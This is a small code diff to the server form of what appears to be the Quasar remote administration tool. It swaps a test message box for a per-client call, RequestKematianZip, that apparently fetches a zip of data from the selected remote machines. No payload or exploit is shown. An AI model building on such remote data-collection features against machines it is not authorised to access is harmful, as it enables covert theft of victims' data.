@@ -538,10 +538,12 @@ namespace Quasar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                MessageBox.Show("test");
-                //c.Send();
-            }
+                var kematianHandler = new KematianHandler(c);
 
+                kematianHandler.RequestKematianZip();
+
+                //kematianHandler.Dispose();
+            }
         }
 
         #endregion
